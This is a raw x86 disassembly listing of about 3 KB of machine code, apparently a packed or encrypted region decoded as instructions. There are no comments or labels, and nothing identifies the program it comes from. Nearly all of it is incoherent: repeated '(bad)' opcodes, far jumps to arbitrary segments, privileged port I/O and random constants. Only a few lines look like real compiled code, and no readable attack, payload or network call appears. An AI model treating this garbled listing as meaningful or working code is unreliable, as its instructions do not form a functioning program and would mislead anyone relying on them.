  421d28:	sub    BYTE PTR [esi],dl
  421d2a:	sbb    eax,0x3e901789
  421d2f:	in     eax,dx
  421d30:	jmp    0x7a75:0x63a80941
  421d37:	rcl    DWORD PTR fs:[esi+ebp*1],1
  421d3b:	cmp    DWORD PTR [ebx-0x12d978f1],esi
  421d41:	sub    ch,BYTE PTR [edx-0x68]
  421d44:	addr16 in eax,0x35
  421d47:	scas   al,BYTE PTR es:[edi]
  421d48:	retf   0x7dfd
  421d4b:	xchg   ebp,eax
  421d4c:	ret    0x481d
  421d4f:	ja     0x421cf1
  421d51:	outs   dx,BYTE PTR ds:[esi]
  421d52:	mov    dh,0x54
  421d54:	lock mul BYTE PTR [edx-0x24]
  421d58:	sbb    cl,ah
  421d5a:	outs   dx,DWORD PTR ds:[esi]
  421d5b:	sar    BYTE PTR [edi],1
  421d5d:	(bad)  
  421d5e:	jmp    0x9290b84b
  421d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d64:	(bad)  
  421d65:	push   cs
  421d66:	shr    BYTE PTR ds:0x322d320b,cl
  421d6c:	and    edi,edi
  421d6e:	add    BYTE PTR [ebp+0x1e],dl
  421d71:	dec    bl
  421d73:	adc    al,0xe2
  421d75:	fs loope 0x421d93
  421d78:	das    
  421d79:	adc    eax,edi
  421d7b:	ds push edi
  421d7d:	cli    
  421d7e:	xchg   esi,eax
  421d7f:	scas   eax,DWORD PTR es:[edi]
  421d80:	popa   
  421d81:	cmp    edx,edx
  421d83:	mov    eax,0xa1ce967f
  421d88:	mov    ss,WORD PTR [ebx+edi*1+0x71]
  421d8c:	mov    dh,0x8f
  421d8e:	mov    edx,0x8f8ca5cd
  421d93:	or     DWORD PTR [ebp+0x32],0xffffffb2
  421d97:	cld    
  421d98:	mov    esi,0xaf8c7dab
  421d9d:	iret   
  421d9e:	cdq    
  421d9f:	adc    al,0x51
  421da1:	fcom   QWORD PTR [ebp-0x64902c6d]
  421da7:	enter  0x735d,0xc4
  421dab:	data16 (bad) 
  421dae:	jmp    0xb03bc335
  421db3:	mov    eax,ds:0xeba594f2
  421db8:	mov    bl,0x0
  421dba:	ja     0x421ddd
  421dbc:	add    esp,DWORD PTR [eax+0x7be8a5ab]
  421dc2:	(bad)  
  421dc3:	loopne 0x421de2
  421dc5:	jbe    0x421e21
  421dc7:	enter  0xd7f,0x79
  421dcb:	and    eax,0x361cb738
  421dd0:	add    eax,0x4266eed
  421dd5:	out    dx,al
  421dd6:	sub    al,0x59
  421dd8:	ret    0xd07e
  421ddb:	mov    esi,0xe5e677f
  421de0:	mov    ah,0xc1
  421de2:	outs   dx,BYTE PTR ds:[esi]
  421de3:	fcom   DWORD PTR gs:[edx+0x1d2f0062]
  421dea:	jno    0x421e5e
  421dec:	jb     0x421d98
  421dee:	outs   dx,DWORD PTR ds:[esi]
  421def:	ficomp DWORD PTR [edx]
  421df1:	inc    esi
  421df2:	mov    ebp,0xba82a349
  421df7:	jns    0x421db5
  421df9:	jecxz  0x421dbb
  421dfb:	in     eax,0x5d
  421dfd:	cmp    ebp,edi
  421dff:	cmp    BYTE PTR [edi+0x1b],al
  421e02:	and    bl,BYTE PTR [ecx+0x1a1476d3]
  421e08:	add    DWORD PTR [ebx+0x605f63f2],0x2a6aef65
  421e12:	xchg   DWORD PTR [ebx-0x7952d1d],ecx
  421e18:	cli    
  421e19:	jno    0x421df6
  421e1b:	cli    
  421e1c:	out    0xed,al
  421e1e:	popa   
  421e1f:	cmp    BYTE PTR [ebx],bh
  421e21:	dec    ebx
  421e22:	push   esi
  421e23:	mov    ds:0xb997b3bb,al
  421e28:	jmp    0xf9459f43
  421e2d:	jmp    0x42233f
  421e32:	les    edi,FWORD PTR [esi]
  421e34:	(bad)  
  421e35:	xlat   BYTE PTR ds:[ebx]
  421e36:	retf   0xd9d7
  421e39:	ror    DWORD PTR [eax+ebx*2+0xf],1
  421e3d:	xchg   esi,eax
  421e3e:	arpl   WORD PTR [esi],bx
  421e40:	sbb    eax,0x7f716472
  421e45:	js     0x421eba
  421e47:	jl     0x421ec1
  421e49:	js     0x421e00
  421e4b:	lea    edx,es:[esi+0xb]
  421e4f:	shl    DWORD PTR [edx+0x12323888],1
  421e55:	jg     0x421e14
  421e57:	in     eax,dx
  421e58:	bound  edi,QWORD PTR [ecx+0x7e26cb76]
  421e5e:	mov    ecx,0x43834ed9
  421e63:	jno    0x421e1b
  421e65:	sbb    BYTE PTR [ecx-0x60],bl
  421e68:	js     0x421edd
  421e6a:	or     ch,BYTE PTR [edx-0x68a379fa]
  421e70:	xor    bh,bl
  421e72:	cmp    dh,BYTE PTR [ebp+0x58]
  421e75:	cmp    ch,bh
  421e77:	jo     0x421ebb
  421e79:	out    0x3c,al
  421e7b:	jp     0x421e48
  421e7d:	sub    edx,DWORD PTR [ebp+0x23267fd3]
  421e83:	int    0x78
  421e85:	mov    al,0xe8
  421e87:	inc    edx
  421e88:	jle    0x421ee6
  421e8a:	push   eax
  421e8b:	pushf  
  421e8c:	call   0x6e8d:0xfc77a362
  421e93:	xchg   DWORD PTR [ebx+0x712cca07],ebp
  421e99:	add    al,0xe
  421e9b:	sub    BYTE PTR [ebp+eax*4+0x77cd9ac9],bh
  421ea2:	xor    eax,0x85c84551
  421ea7:	pop    es
  421ea8:	bnd jnp 0x421eb6
  421eab:	ds call 0x30b83f50
  421eb1:	mov    esi,DWORD PTR [esi+0x42803ae8]
  421eb7:	retf   0xcca
  421eba:	mov    ds:0xd930793f,al
  421ebf:	pop    esi
  421ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ec1:	sub    DWORD PTR [ecx+0x152f1436],eax
  421ec7:	cld    
  421ec8:	das    
  421ec9:	jp     0x421e9b
  421ecb:	fs (bad) 
  421ecd:	pop    ss
  421ece:	lods   al,BYTE PTR ds:[esi]
  421ecf:	mov    ah,0xdb
  421ed1:	outs   dx,BYTE PTR ds:[esi]
  421ed2:	adc    BYTE PTR [eax+0x1d65c06c],al
  421ed8:	xchg   ecx,eax
  421ed9:	cld    
  421eda:	loop   0x421f1b
  421edc:	sbb    esi,DWORD PTR [ebp+eiz*2+0x73be1999]
  421ee3:	push   esi
  421ee4:	xchg   eax,eax
  421ee6:	pusha  
  421ee7:	or     BYTE PTR [eax-0x3b],0x18
  421eeb:	cmp    bl,BYTE PTR [eax+ecx*1]
  421eee:	cld    
  421eef:	adc    al,0x45
  421ef1:	add    DWORD PTR [esi+edi*1-0x52920b5],edx
  421ef8:	js     0x421eb3
  421efa:	add    al,BYTE PTR [ebp+0x42]
  421efd:	aaa    
  421efe:	cmp    dh,BYTE PTR [eax]
  421f00:	shr    esp,cl
  421f02:	fwait
  421f03:	mov    ebx,0x4c97b131
  421f08:	retf   0xaecf
  421f0b:	pop    es
  421f0c:	jns    0x421f05
  421f0e:	cmp    DWORD PTR [ecx],eax
  421f10:	jbe    0x421ec6
  421f12:	inc    eax
  421f13:	sahf   
  421f14:	cmp    ebp,DWORD PTR [ebx]
  421f16:	mov    cl,0xba
  421f18:	mov    dl,0x6b
  421f1a:	loope  0x421ef8
  421f1c:	sub    al,0xb4
  421f1e:	jne    0x421f19
  421f20:	push   ss
  421f21:	jo     0x421f19
  421f23:	call   FWORD PTR [ebx]
  421f25:	mov    ds:0x86fab11c,eax
  421f2a:	out    0xf0,al
  421f2c:	loope  0x421fa3
  421f2e:	imul   BYTE PTR [ebp-0x7e]
  421f31:	or     eax,DWORD PTR [eax]
  421f33:	xor    BYTE PTR [edi+0x2d],al
  421f36:	lods   al,BYTE PTR ds:[esi]
  421f37:	cld    
  421f38:	fidivr WORD PTR [edx]
  421f3a:	xchg   edi,eax
  421f3b:	push   esi
  421f3c:	jno    0x421f1c
  421f3e:	jl     0x421f45
  421f40:	fwait
  421f41:	mov    ah,0x6f
  421f43:	hlt    
  421f44:	(bad)  
  421f45:	jns    0x421ef4
  421f47:	mov    al,ds:0x60c5bc88
  421f4c:	iret   
  421f4d:	outs   dx,BYTE PTR ds:[esi]
  421f4e:	inc    ebx
  421f4f:	loopne 0x421faa
  421f51:	inc    ebp
  421f52:	xchg   BYTE PTR [eax+eiz*4+0x5f6b9636],cl
  421f59:	inc    eax
  421f5a:	inc    esp
  421f5b:	imul   ebp,DWORD PTR [eax],0xd35bdc0e
  421f61:	dec    edx
  421f62:	jae    0x421f37
  421f64:	mov    ecx,0xdc51120a
  421f69:	shl    dl,1
  421f6b:	mov    al,ds:0x8a52157
  421f70:	into   
  421f71:	or     eax,0xa0f6c446
  421f76:	or     edx,DWORD PTR [ebx]
  421f78:	pusha  
  421f79:	mov    al,0x44
  421f7b:	mov    ebx,esi
  421f7d:	cli    
  421f7e:	imul   edx,DWORD PTR [esi+0x62],0xffffffa0
  421f82:	scas   eax,DWORD PTR es:[edi]
  421f83:	jmp    DWORD PTR [edi-0x53fd187f]
  421f89:	pop    ds
  421f8a:	je     0x421f5f
  421f8c:	jp     0x421fd5
  421f8e:	shl    BYTE PTR [esi+0x5d],1
  421f91:	jns    0x422002
  421f93:	jnp    0x421fa7
  421f95:	xor    DWORD PTR [ebp+0x11cc0d79],0xd01f4ab0
  421f9f:	dec    ebp
  421fa0:	cmp    DWORD PTR [ebp+0x53],eax
  421fa3:	inc    bx
  421fa5:	jge    0x421f96
  421fa7:	xor    BYTE PTR [ebx],al
  421fa9:	mov    dh,0x98
  421fab:	inc    esi
  421fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fad:	pushw  0xfd96
  421fb1:	repnz cmp eax,0x4a02c13f
  421fb8:	(bad)  
  421fb9:	fwait
  421fba:	mov    eax,ds:0xf0282ab7
  421fbf:	xchg   ecx,eax
  421fc0:	into   
  421fc1:	sub    dh,0x3f
  421fc4:	clc    
  421fc5:	jecxz  0x42202e
  421fc7:	cmc    
  421fc8:	xchg   DWORD PTR [ebp-0x6b596bd],ebx
  421fce:	pusha  
  421fcf:	shr    BYTE PTR [edx+esi*1-0x32],0x47
  421fd4:	int3   
  421fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fd6:	jmp    0x4d3b9079
  421fdb:	mov    ecx,0x7e676bd2
  421fe0:	test   edi,esi
  421fe2:	scas   al,BYTE PTR es:[edi]
  421fe3:	push   ebp
  421fe4:	hlt    
  421fe5:	in     eax,0x17
  421fe7:	fwait
  421fe8:	dec    eax
  421fe9:	adc    al,0x2f
  421feb:	cs out dx,eax
  421fed:	test   DWORD PTR [eax+0x7da72def],edx
  421ff3:	fnstcw WORD PTR [esi]
  421ff5:	out    0x7,eax
  421ff7:	cs adc esp,ecx
  421ffa:	mov    eax,fs
  421ffc:	sar    bl,0x3e
  421fff:	rol    BYTE PTR [esi],1
  422001:	or     al,0xa6
  422003:	fmul   DWORD PTR [esi-0x4d]
  422006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422007:	adc    DWORD PTR [ecx-0x501ceaae],eax
  42200d:	inc    eax
  42200e:	mov    ecx,0xbbb1e9ad
  422013:	iret   
  422014:	aas    
  422015:	xor    edx,DWORD PTR [eax+0x4]
  422018:	pop    ss
  422019:	push   ebx
  42201a:	mov    ds:0x5e496815,eax
  42201f:	pop    esi
  422020:	cmp    al,0x21
  422022:	and    bh,BYTE PTR [edi-0x1b041743]
  422028:	push   esi
  422029:	nop
  42202a:	and    DWORD PTR [edi],0xffffffaa
  42202d:	stos   BYTE PTR es:[edi],al
  42202e:	in     eax,dx
  42202f:	into   
  422030:	icebp  
  422031:	leave  
  422032:	test   eax,0x37e4da74
  422037:	(bad)  
  422038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422039:	push   eax
  42203a:	rcr    DWORD PTR [edi+0x2b],cl
  42203d:	cmp    edi,ebx
  42203f:	xchg   ebx,eax
  422040:	jno    0x421ffe
  422042:	pushf  
  422043:	dec    ebx
  422044:	leave  
  422045:	dec    eax
  422046:	pop    esi
  422047:	sub    BYTE PTR [ecx],bh
  422049:	xor    cl,al
  42204b:	xor    BYTE PTR [edx-0x22],ah
  42204e:	aas    
  42204f:	add    al,BYTE PTR [ecx-0x45]
  422052:	lock and eax,0x44d737c6
  422058:	inc    esi
  422059:	int3   
  42205a:	xchg   BYTE PTR [edx+0x6a],bl
  42205d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42205e:	fwait
  42205f:	jne    0x4220ac
  422061:	add    al,bl
  422063:	sbb    eax,0xb5a5b652
  422068:	inc    edi
  422069:	jmp    0x42202b
  42206b:	mov    dh,0xf1
  42206d:	jmp    0x422079
  42206f:	sbb    BYTE PTR [esi-0x1d],dl
  422072:	out    dx,al
  422073:	fs arpl ax,sp
  422076:	lea    eax,[ebx+eax*4]
  422079:	fmul   st,st(6)
  42207b:	sub    eax,0x82b7667f
  422080:	imul   ebx,DWORD PTR [edx],0x59
  422083:	and    dl,BYTE PTR [eax]
  422085:	cmp    eax,0xf4d73053
  42208a:	push   ss
  42208b:	lods   al,BYTE PTR ds:[esi]
  42208c:	dec    edx
  42208d:	xor    al,0xfe
  42208f:	mov    al,ds:0xd5a028a5
  422094:	pop    edx
  422095:	mov    ds:0xa8a74ac0,al
  42209a:	shl    BYTE PTR [edi],1
  42209c:	in     al,0x23
  42209e:	mov    bl,BYTE PTR [ecx+0x12aff5c2]
  4220a4:	cs cmp eax,0xfefcde3b
  4220aa:	xor    al,0xb3
  4220ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ad:	xor    eax,0xda15b8ca
  4220b2:	xor    al,0x44
  4220b4:	xor    esp,esi
  4220b6:	imul   BYTE PTR [ecx+ebx*8]
  4220b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220ba:	jns    0x42210b
  4220bc:	dec    esp
  4220bd:	mov    al,0x70
  4220bf:	mov    ds:0x53751158,al
  4220c4:	pop    edx
  4220c5:	hlt    
  4220c6:	add    ebx,DWORD PTR [ebp-0x3215890b]
  4220cc:	int    0x9d
  4220ce:	jl     0x422100
  4220d0:	jmp    0x95fa:0xade7d9bf
  4220d7:	mov    cs,WORD PTR [edx+ecx*4+0x7b31415d]
  4220de:	enter  0x49ec,0x7d
  4220e2:	mov    cs,WORD PTR [eax]
  4220e4:	add    DWORD PTR [esi-0x12],0xffffffab
  4220e8:	cmp    eax,esp
  4220ea:	scas   al,BYTE PTR es:[edi]
  4220eb:	retf   
  4220ec:	push   edx
  4220ed:	jp     0x4220e0
  4220ef:	fmul   st,st(6)
  4220f1:	imul   edx,ebx,0x4d7071a4
  4220f7:	push   esp
  4220f8:	dec    edi
  4220f9:	stos   DWORD PTR es:[edi],eax
  4220fa:	jg     0x422090
  4220fc:	and    al,0xa
  4220fe:	sbb    esp,DWORD PTR [ebp+0x749a1d07]
  422104:	push   es
  422105:	xchg   edi,eax
  422106:	xchg   BYTE PTR [edi+0x1e],dh
  422109:	mov    al,0xd8
  42210b:	sub    DWORD PTR [ebp+0x4d],esp
  42210e:	mov    bh,0xde
  422110:	dec    esp
  422111:	mov    ch,0xc0
  422113:	sub    edi,DWORD PTR [ecx+0x605239fb]
  422119:	push   0x4d
  42211b:	and    edi,eax
  42211d:	mov    ds:0x634bff0b,eax
  422122:	mov    edi,0x3d979900
  422127:	or     BYTE PTR [eax-0x1d],dh
  42212a:	sub    BYTE PTR es:0x5e438c47,cl
  422131:	div    BYTE PTR [edi-0x6137955c]
  422137:	jb     0x42219a
  422139:	enter  0x45b3,0x88
  42213d:	push   cs
  42213e:	push   ss
  42213f:	lods   al,BYTE PTR ds:[esi]
  422140:	sbb    ah,bl
  422142:	dec    ecx
  422143:	nop
  422144:	mov    dh,0x71
  422146:	pusha  
  422147:	in     al,0x60
  422149:	pop    ebp
  42214a:	dec    eax
  42214b:	pop    edx
  42214c:	cmp    BYTE PTR [ebx-0x460c5ce2],0xd7
  422153:	xchg   BYTE PTR [edx],dl
  422155:	test   BYTE PTR [ecx+0x4f],dl
  422158:	cmp    al,0x43
  42215a:	pop    ebp
  42215b:	and    eax,0xd31eacda
  422160:	lea    esp,[eax+0x45]
  422163:	loopne 0x4221b7
  422165:	inc    ebx
  422166:	dec    esp
  422167:	addr16 jo 0x422172
  42216a:	cdq    
  42216b:	add    edi,eax
  42216d:	int3   
  42216e:	adc    eax,0xe7a58201
  422173:	mov    eax,ds:0xcdf7bc4d
  422178:	call   0xaffe:0xa5a58c7
  42217f:	xor    eax,DWORD PTR [ebx+0x10a4e0cd]
  422185:	or     BYTE PTR [ebx],bl
  422187:	sub    dl,cl
  422189:	fwait
  42218a:	jb     0x4221f7
  42218c:	gs int 0xa
  42218f:	fsub   DWORD PTR [ebx+0x5793671c]
  422195:	(bad)  
  422196:	sbb    eax,0x509f1bb1
  42219b:	arpl   WORD PTR [edx],bx
  42219d:	pop    ss
  42219e:	retf   
  42219f:	scas   eax,DWORD PTR es:[edi]
  4221a0:	rol    BYTE PTR [esi-0x2a09666f],1
  4221a6:	aad    0x33
  4221a8:	leave  
  4221a9:	pop    ecx
  4221aa:	dec    ebp
  4221ab:	lahf   
  4221ac:	sti    
  4221ad:	pop    ecx
  4221ae:	inc    edi
  4221af:	dec    edi
  4221b0:	rol    bh,cl
  4221b2:	inc    eax
  4221b3:	and    eax,DWORD PTR [ebx]
  4221b5:	sub    bh,BYTE PTR [ebx+edi*8+0x1930bf2a]
  4221bc:	xor    esp,DWORD PTR [ecx+0xba26954]
  4221c2:	fstp   st(6)
  4221c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221c5:	pop    ds
  4221c6:	jo     0x4221ce
  4221c8:	push   0xfffffffe
  4221ca:	jns    0x422184
  4221cc:	and    DWORD PTR [esi],edi
  4221ce:	mov    eax,ds:0x6730f1d2
  4221d3:	mov    esp,0xb6b2d34c
  4221d8:	(bad)  
  4221d9:	xchg   edx,eax
  4221da:	jns    0x42224b
  4221dc:	xchg   ebp,eax
  4221dd:	in     al,dx
  4221de:	sub    ebx,DWORD PTR [edi]
  4221e0:	push   ds
  4221e1:	(bad)  
  4221e3:	out    0xb,al
  4221e5:	retf   
  4221e6:	(bad)  
  4221e8:	mov    BYTE PTR [esi+0x1dc68e0a],ah
  4221ee:	(bad)  
  4221ef:	pop    esp
  4221f0:	lahf   
  4221f1:	fcomp  DWORD PTR [ebx+0x40ce21a5]
  4221f7:	xor    edx,DWORD PTR [edx]
  4221f9:	jecxz  0x422260
  4221fb:	adc    al,0x3a
  4221fd:	retf   0xdb1f
  422200:	in     eax,dx
  422201:	imul   edi,DWORD PTR [edx+ecx*8-0x8d92e13],0x6
  422209:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42220b:	push   0xffffffc1
  42220d:	xor    bl,BYTE PTR ss:[ebx-0xa]
  422211:	test   eax,0x8383d3bf
  422216:	fs dec esi
  422218:	fidivr WORD PTR [ebx-0x17]
  42221b:	cmp    al,0xfe
  42221d:	lock leave 
  42221f:	lds    esp,FWORD PTR [ebx+0x13]
  422222:	stos   DWORD PTR es:[edi],eax
  422223:	or     BYTE PTR [ebx+0x72],bl
  422226:	mov    dh,0x7b
  422228:	rol    edx,1
  42222a:	pop    es
  42222b:	pushf  
  42222c:	loop   0x422251
  42222e:	cdq    
  42222f:	and    DWORD PTR [ecx+edx*2],0x18
  422233:	mov    eax,0x7b75247b
  422238:	popa   
  422239:	in     al,dx
  42223a:	repnz call 0x67cf:0xc417c6a
  422242:	ins    DWORD PTR es:[edi],dx
  422243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422244:	push   edi
  422245:	outs   dx,DWORD PTR es:[esi]
  422247:	popf   
  422248:	push   cs
  422249:	test   ebx,ecx
  42224b:	inc    edx
  42224c:	nop
  42224d:	shl    DWORD PTR [eax],0x13
  422250:	jo     0x42229d
  422252:	or     BYTE PTR [esi+eax*1-0x7b],ah
  422256:	scas   al,BYTE PTR es:[edi]
  422257:	arpl   WORD PTR ds:0x1e9f7b12,bp
  42225d:	(bad)  
  42225e:	out    0xf1,eax
  422260:	(bad)  
  422262:	iret   
  422263:	xchg   ebp,eax
  422264:	cmp    BYTE PTR [eax-0x20740dcc],dl
  42226a:	shl    BYTE PTR [ecx+eax*1-0x65],1
  42226e:	(bad)
  422271:	mov    dl,0xa3
  422273:	push   ecx
  422274:	pop    eax
  422275:	and    ah,BYTE PTR [edi-0x3e]
  422278:	cld    
  422279:	imul   edi,DWORD PTR [edx-0x1c88c4f7],0xc8a4645d
  422283:	cli    
  422284:	ss mov cl,0x55
  422287:	xor    ah,bl
  422289:	dec    ebp
  42228a:	and    eax,0xdf21066f
  42228f:	jge    0x4222fe
  422291:	jbe    0x422304
  422293:	pop    ecx
  422294:	addr16 push ss
  422296:	or     bh,BYTE PTR [ebx-0x12]
  422299:	in     eax,0x3e
  42229b:	dec    edx
  42229c:	mov    al,0x24
  42229e:	outs   dx,BYTE PTR ds:[esi]
  42229f:	xchg   ebp,ecx
  4222a1:	out    0x5a,eax
  4222a3:	add    ecx,DWORD PTR [ebx-0x78]
  4222a6:	or     ebx,DWORD PTR [esi]
  4222a8:	call   0xefd7867
  4222ad:	jecxz  0x42227e
  4222af:	neg    DWORD PTR [esi-0x15]
  4222b2:	mov    edx,0x80c21ca6
  4222b7:	(bad)  
  4222b8:	ins    BYTE PTR es:[edi],dx
  4222b9:	jne    0x422299
  4222bb:	push   0xfffffffc
  4222bd:	enter  0x2c30,0x22
  4222c1:	stos   BYTE PTR es:[edi],al
  4222c2:	mov    ebx,0xa62da802
  4222c7:	pop    ebx
  4222c8:	sbb    ch,BYTE PTR [edi+0x21e4ea5f]
  4222ce:	xchg   ebp,eax
  4222cf:	inc    ebx
  4222d0:	out    0x3a,al
  4222d2:	inc    esp
  4222d3:	pop    edi
  4222d4:	xchg   esp,eax
  4222d5:	bound  esi,QWORD PTR [ebp+0x4f791b32]
  4222db:	mov    cl,0xa2
  4222dd:	or     bl,BYTE PTR es:[esi-0x1f2950b5]
  4222e4:	retf   0x31e
  4222e7:	aaa    
  4222e8:	push   edi
  4222e9:	mov    dl,0x9d
  4222eb:	inc    esp
  4222ec:	inc    eax
  4222ed:	ss sbb ebp,edx
  4222f0:	sbb    dl,BYTE PTR ds:[esi]
  4222f3:	call   0xa1ff:0xa947781e
  4222fa:	call   0x3df3:0x82a1afa7
  422301:	cld    
  422302:	xchg   edi,eax
  422303:	popa   
  422304:	jle    0x422326
  422306:	outs   dx,BYTE PTR ds:[esi]
  422307:	adc    edx,DWORD PTR [esi-0x8eb804]
  42230d:	pop    ds
  42230e:	cwde   
  42230f:	iret   
  422310:	mov    edi,0xb95ff993
  422315:	scas   al,BYTE PTR es:[edi]
  422316:	push   0xffffff83
  422318:	mov    DWORD PTR [edx+0x2e],esp
  42231b:	push   0x883a1fe1
  422320:	mov    edi,0xbbc6dea4
  422325:	test   eax,0x6e0b1851
  42232a:	dec    ecx
  42232b:	ins    DWORD PTR es:[edi],dx
  42232c:	pop    ebp
  42232d:	cmp    DWORD PTR [ecx],esi
  42232f:	mov    ds:0x3216578f,eax
  422334:	pop    ebx
  422335:	push   0xacd61991
  42233a:	mov    ebx,0xd2a68f2f
  42233f:	add    edx,ecx
  422341:	imul   edx,edi
  422344:	mov    edi,DWORD PTR [ebp-0x8]
  422347:	mov    ebx,DWORD PTR [ebp-0x10]
  42234a:	sub    ebx,edi
  42234c:	cmp    ebx,edx
  42234e:	ja     0x42286e
  422354:	jmp    0x422866
  422359:	ror    edx,1
  42235b:	sar    DWORD PTR [esi],0xd9
  42235e:	vpsubusw xmm1,xmm5,XMMWORD PTR [esi-0x5211f552]
  422366:	divps  xmm5,xmm6
  422369:	pop    edi
  42236a:	je     0x4223eb
  42236c:	js     0x4223e1
  42236e:	jl     0x4223e8
  422370:	js     0x42236e
  422372:	pusha  
  422373:	xchg   ebx,eax
  422374:	xchg   DWORD PTR [eax-0x6a9b5495],eax
  42237a:	xor    al,dh
  42237c:	imul   eax,edx,0x72
  42237f:	(bad)  
  422381:	imul   esi,edx,0xc31624e5
  422387:	fsubr  st,st(2)
  422389:	fcom   DWORD PTR [edi]
  42238b:	loope  0x4223d6
  42238d:	xor    al,0x4e
  42238f:	shr    DWORD PTR [ebx+ecx*8+0x4fac343b],1
  422396:	std    
  422397:	cmp    BYTE PTR [ebx+0x4a],0x96
  42239b:	jb     0x422393
  42239d:	mov    al,es:0xb1b97c63
  4223a3:	lds    edx,FWORD PTR [edx]
  4223a5:	(bad)  
  4223a6:	aad    0x84
  4223a8:	xchg   edi,eax
  4223a9:	not    DWORD PTR [ebx]
  4223ab:	ja     0x4223ad
  4223ad:	je     0x422378
  4223af:	pop    es
  4223b0:	idiv   al
  4223b2:	jo     0x4223e1
  4223b4:	mov    dh,0xc3
  4223b6:	(bad)
  4223b9:	sub    edi,DWORD PTR [edi]
  4223bb:	(bad)  
  4223bc:	xacquire xchg DWORD PTR [edi-0x1],esp
  4223c0:	loop   0x422383
  4223c2:	(bad)  
  4223c3:	mov    eax,DWORD PTR [eax+0xb]
  4223c6:	sub    eax,DWORD PTR [edi+edx*8-0x4bfdb509]
  4223cd:	push   esi
  4223ce:	push   ds
  4223cf:	jb     0x42243b
  4223d1:	sbb    dl,cl
  4223d3:	mov    esp,0xde0af3fc
  4223d8:	cmp    eax,0xabde1f11
  4223dd:	jb     0x422430
  4223df:	mov    al,bl
  4223e1:	jl     0x42237c
  4223e3:	fs dec ebp
  4223e5:	pop    DWORD PTR [ecx+0x2]
  4223e8:	cs pop ds
  4223ea:	cmp    edi,DWORD PTR [ebx+0x50d71e14]
  4223f0:	mov    bl,0xd4
  4223f2:	fsub   DWORD PTR [ebp-0x67]
  4223f5:	lods   al,BYTE PTR ds:[esi]
  4223f6:	sbb    dl,BYTE PTR [eax+0x1423b026]
  4223fc:	bound  edx,QWORD PTR [ebp+0x5eded3e8]
  422402:	stos   DWORD PTR es:[edi],eax
  422403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422404:	aaa    
  422405:	std    
  422406:	and    eax,0x78f6ea9c
  42240b:	dec    eax
  42240c:	in     al,dx
  42240d:	loop   0x422456
  42240f:	push   ds
  422410:	shr    BYTE PTR [edi],0x77
  422413:	jle    0x4223b1
  422415:	arpl   WORD PTR [ebx+eax*2],dx
  422418:	cmc    
  422419:	pop    esi
  42241a:	mov    esi,0xdabf4111
  42241f:	mov    edi,DWORD PTR [ecx+eiz*8+0x68b33c5]
  422426:	mov    dl,0xfb
  422428:	mov    bl,0xdf
  42242a:	mov    esp,0x38a5f3f4
  42242f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422430:	loope  0x4223cf
  422432:	repz sbb BYTE PTR [ebx],bl
  422435:	xor    al,0x37
  422437:	out    0x58,al
  422439:	pop    edi
  42243a:	dec    eax
  42243b:	mov    edi,0xe104b454
  422440:	jns    0x42246e
  422442:	arpl   WORD PTR [ebp-0x56421d8e],ax
  422448:	dec    edi
  422449:	or     al,0x36
  42244b:	and    dh,BYTE PTR [edi+ebx*2+0xee5e492]
  422452:	xor    eax,edi
  422454:	shl    DWORD PTR ds:0xc8be5d65,0x85
  42245b:	cwde   
  42245c:	in     eax,dx
  42245d:	rol    al,0xa7
  422460:	adc    DWORD PTR [ebx],0x39
  422463:	(bad)  
  422464:	mov    ebx,0xcf6e04f5
  422469:	mov    ebx,0xc2829919
  42246e:	gs add al,0xf
  422471:	push   0x37
  422473:	cli    
  422474:	pop    edi
  422475:	pop    ebx
  422476:	jmp    0x422443
  422478:	ret    
  422479:	xor    DWORD PTR [esi],ecx
  42247b:	sbb    bh,BYTE PTR ds:0x67a2345
  422481:	cmc    
  422482:	in     al,dx
  422483:	mov    ah,0x14
  422485:	es nop
  422487:	fst    st(0)
  422489:	dec    eax
  42248a:	scas   eax,DWORD PTR es:[edi]
  42248b:	loop   0x422435
  42248d:	iret   
  42248e:	add    eax,0x96a83fa9
  422493:	adc    al,BYTE PTR [ebx-0x23]
  422496:	adc    DWORD PTR [esi+0x48],esi
  422499:	adc    ebx,ebx
  42249b:	bnd jns 0x422485
  42249e:	cmp    DWORD PTR gs:0xd0542fb8,edx
  4224a5:	sbb    eax,0xaf908e97
  4224aa:	clc    
  4224ab:	test   DWORD PTR [eax],ebx
  4224ad:	and    bh,BYTE PTR [ecx+0x6431437a]
  4224b3:	mov    edi,0xf903e350
  4224b8:	pop    es
  4224b9:	shl    BYTE PTR [eax],cl
  4224bb:	pusha  
  4224bc:	jg     0x422481
  4224be:	(bad)  
  4224bf:	nop
  4224c0:	sbb    BYTE PTR [esi],ch
  4224c2:	sbb    ecx,edi
  4224c4:	inc    edi
  4224c5:	aam    0x8e
  4224c7:	dec    eax
  4224c8:	mov    al,0xfb
  4224ca:	lds    ebx,FWORD PTR [ecx]
  4224cc:	aam    0xd8
  4224ce:	dec    ebp
  4224cf:	cmc    
  4224d0:	outs   dx,BYTE PTR ds:[esi]
  4224d1:	repnz mov ecx,0x5e7f9ee3
  4224d7:	mov    ch,0x51
  4224d9:	test   eax,0x31342569
  4224de:	icebp  
  4224df:	imul   ebx,DWORD PTR [esi-0x9f4865a],0x668de823
  4224e9:	mov    WORD PTR [esi+0x687860bb],fs
  4224ef:	xchg   esi,eax
  4224f0:	inc    edi
  4224f1:	xor    eax,0x85075359
  4224f6:	push   0xffffff80
  4224f8:	and    edi,DWORD PTR [ebp-0x38cfa8e0]
  4224fe:	out    dx,eax
  4224ff:	and    eax,0x7d1bfe76
  422504:	fdivr  DWORD PTR [ecx]
  422506:	dec    ebp
  422507:	mov    ecx,0x482ffa14
  42250c:	sar    BYTE PTR [edi-0x2e],1
  42250f:	sbb    BYTE PTR [ebp+ebx*2+0x1c],dh
  422513:	ret    
  422514:	jl     0x4224e8
